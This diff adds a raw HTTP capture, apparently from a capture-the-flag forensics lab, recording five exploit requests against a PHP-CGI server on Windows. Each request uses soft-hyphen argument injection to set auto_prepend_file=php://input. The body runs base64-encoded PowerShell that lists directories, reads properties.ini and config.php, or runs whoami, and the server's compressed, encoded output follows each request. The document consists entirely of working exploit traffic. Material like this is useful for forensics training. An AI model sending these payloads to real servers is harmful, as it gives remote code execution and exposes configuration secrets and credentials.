@@ -1,0 +1,100 @@
+POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+Accept-Encoding: identity
+Host: halloweencorp.htb
+User-Agent: curl/8.3.0
+Accept: /
+Content-Length: 636
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoIEM6OyAkYnl0ZXMgPSBbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJG91dHB1dCk7ICRjb21wcmVzc2VkU3RyZWFtID0gW1N5c3RlbS5JTy5NZW1vcnlTdHJlYW1dOjpuZXcoKTsgJGNvbXByZXNzb3IgPSBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW1dOjpuZXcoJGNvbXByZXNzZWRTdHJlYW0sIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6Q29tcHJlc3MpOyAkY29tcHJlc3Nvci5Xcml0ZSgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOyAkY29tcHJlc3Nvci5DbG9zZSgpOyAkY29tcHJlc3NlZEJ5dGVzID0gJGNvbXByZXNzZWRTdHJlYW0uVG9BcnJheSgpOyBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb21wcmVzc2VkQnl0ZXMpIg==')); ?>HTTP/1.1 302 Found
+Date: Fri, 13 Sep 2024 21:12:37 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
+X-Powered-By: PHP/8.1.25
+Location: http://halloweencorp.htb/dashboard/
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+FchbCsAgDAXRrWQF2VN8XzAajLTS1bf9GTiTxFuYshJBK905SMeTFx1RMxKzjigbczi3rZ0C9hAFR3eKcxRUtmZU5MJH/kIYKZ//vg==
+POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+Accept-Encoding: identity
+Host: halloweencorp.htb
+User-Agent: curl/8.3.0
+Accept: /
+Content-Length: 644
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoIEM6XHhhbXBwOyAkYnl0ZXMgPSBbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJG91dHB1dCk7ICRjb21wcmVzc2VkU3RyZWFtID0gW1N5c3RlbS5JTy5NZW1vcnlTdHJlYW1dOjpuZXcoKTsgJGNvbXByZXNzb3IgPSBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW1dOjpuZXcoJGNvbXByZXNzZWRTdHJlYW0sIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6Q29tcHJlc3MpOyAkY29tcHJlc3Nvci5Xcml0ZSgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOyAkY29tcHJlc3Nvci5DbG9zZSgpOyAkY29tcHJlc3NlZEJ5dGVzID0gJGNvbXByZXNzZWRTdHJlYW0uVG9BcnJheSgpOyBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb21wcmVzc2VkQnl0ZXMpIg==')); ?>HTTP/1.1 302 Found
+Date: Fri, 13 Sep 2024 21:12:38 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
+X-Powered-By: PHP/8.1.25
+Location: http://halloweencorp.htb/dashboard/
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+bZFrcsMgDISvogvEV2JkUGNNeBWJxOnpizFx3Ez/8a3YFRIYU3yGVAUwo10I7JUvM0ewKWrhGRZ1yQpwuAJHUfQePFuKQgI+WfQEAdmnqrlqP2pyLDcIT/n2kJcMUixoyPCg2eF9NDItq+g0o76FlDtbbG04ohEq99brQzx8J+nlVC+2cN7rX+zph73fgrTmT+3IOWsj6NYwl2RJpHOgYmt5nkxvZVj6vOcLg0c5o8gjFSeTro1KylSUSSaODIXQBTKOenEQxU6vJdBK0OcwK4a8hyqJmrbiDjWOD5rcH9qM3XLpf5r+U7ZHdMXIQs2z5Q3uAx2OfaCGvw==
+POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+Accept-Encoding: identity
+Host: halloweencorp.htb
+User-Agent: curl/8.3.0
+Accept: /
+Content-Length: 660
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSBHZXQtQ29udGVudCAtUGF0aCBDOlx4YW1wcFxwcm9wZXJ0aWVzLmluaTsgJGJ5dGVzID0gW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRvdXRwdXQpOyAkY29tcHJlc3NlZFN0cmVhbSA9IFtTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtXTo6bmV3KCk7ICRjb21wcmVzc29yID0gW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5EZWZsYXRlU3RyZWFtXTo6bmV3KCRjb21wcmVzc2VkU3RyZWFtLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkNvbXByZXNzKTsgJGNvbXByZXNzb3IuV3JpdGUoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKTsgJGNvbXByZXNzb3IuQ2xvc2UoKTsgJGNvbXByZXNzZWRCeXRlcyA9ICRjb21wcmVzc2VkU3RyZWFtLlRvQXJyYXkoKTsgW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29tcHJlc3NlZEJ5dGVzKSI=')); ?>HTTP/1.1 302 Found
+Date: Fri, 13 Sep 2024 21:12:39 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
+X-Powered-By: PHP/8.1.25
+Location: http://halloweencorp.htb/dashboard/
+Keep-Alive: timeout=5, max=98
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+hZJdb4IwFIb/Sv8AguKcWdILs4vtYiYsu1kihBxLlcbS1rZM+fcrH92I8SNcQM/z9HDewuaNCqqBZ4gJY4Hzgmn8+pKeoVIKbcHQ3JXJIRdQUfy9WifJuHqgDR6vf6g2TAq8nEwns6cgGjPFwe6krvCJiUKeTHBezNFmpYCUNEPQ3XNDteuRK6ktXkYXVWN4T+bz2CMtpc3d0JRYqRscdoOHPfROaQtJzMjyAcOeeK+QFTDRJZ3OnieRu6aeESl2bF9rsC7ftVa9F7ae31MLdqz76Rmh/RGizbr5+vzIUNWY4xAnjqPFsC6lsZhLArx9GooXGf0r044OzpYJ0M1NK3V8MAuwcNtr6SA+jNxp4X9n0Pu6osIaHNSoHRoFCRqFu34eyXuSIVWqOxEc7YxHE/2J9GypaP/Ea1+9tVJn/AI=
+POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+Accept-Encoding: identity
+Host: halloweencorp.htb
+User-Agent: curl/8.3.0
+Accept: /
+Content-Length: 664
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSBHZXQtQ29udGVudCAtUGF0aCBDOlx4YW1wcFxodGRvY3NcY29uZmlnLnBocDsgJGJ5dGVzID0gW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRvdXRwdXQpOyAkY29tcHJlc3NlZFN0cmVhbSA9IFtTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtXTo6bmV3KCk7ICRjb21wcmVzc29yID0gW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5EZWZsYXRlU3RyZWFtXTo6bmV3KCRjb21wcmVzc2VkU3RyZWFtLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkNvbXByZXNzKTsgJGNvbXByZXNzb3IuV3JpdGUoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKTsgJGNvbXByZXNzb3IuQ2xvc2UoKTsgJGNvbXByZXNzZWRCeXRlcyA9ICRjb21wcmVzc2VkU3RyZWFtLlRvQXJyYXkoKTsgW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29tcHJlc3NlZEJ5dGVzKSI=')); ?>HTTP/1.1 302 Found
+Date: Fri, 13 Sep 2024 21:12:40 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
+X-Powered-By: PHP/8.1.25
+Location: http://halloweencorp.htb/dashboard/
+Keep-Alive: timeout=5, max=97
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+dY9RS8MwFIX/ynUIyWDKZNkYTjdSW/DFKe3Ux0ttbligpjVtGTL2311a58bA+xIO37nnntwtynUJirSxxFkYYBLFb1HMBsDUB+vPTtHrni3lU9RBbCpyZ44XmSTvz3HoHY+rYKuHE1Q3Y1GWI+FGCoVVqHMxwY2oUA8bqy52ZxGhXMlAJu2RdBwsU6W9Ay4/v6uv3MA9WNpAJ/hf3wGc9GvFoUorDqE+yGjgv2FX86ywlrIaybnC9WELfpQh3nvoiCks6NTkpG6hB9fwz+YMdnBkFdWYrVO3fzlraj31P1jMfwA=
+POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+Accept-Encoding: identity
+Host: halloweencorp.htb
+User-Agent: curl/8.3.0
+Accept: /
+Content-Length: 612
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSB3aG9hbWk7ICRieXRlcyA9IFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkb3V0cHV0KTsgJGNvbXByZXNzZWRTdHJlYW0gPSBbU3lzdGVtLklPLk1lbW9yeVN0cmVhbV06Om5ldygpOyAkY29tcHJlc3NvciA9IFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uRGVmbGF0ZVN0cmVhbV06Om5ldygkY29tcHJlc3NlZFN0cmVhbSwgW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpDb21wcmVzcyk7ICRjb21wcmVzc29yLldyaXRlKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk7ICRjb21wcmVzc29yLkNsb3NlKCk7ICRjb21wcmVzc2VkQnl0ZXMgPSAkY29tcHJlc3NlZFN0cmVhbS5Ub0FycmF5KCk7IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGNvbXByZXNzZWRCeXRlcyki')); ?>HTTP/1.1 302 Found
+Date: Fri, 13 Sep 2024 21:12:41 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
+X-Powered-By: PHP/8.1.25
+Location: http://halloweencorp.htb/dashboard/
+Keep-Alive: timeout=5, max=96
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+S0ktzi7JL9AtyM3PzDFIiSktLjIwBAA=
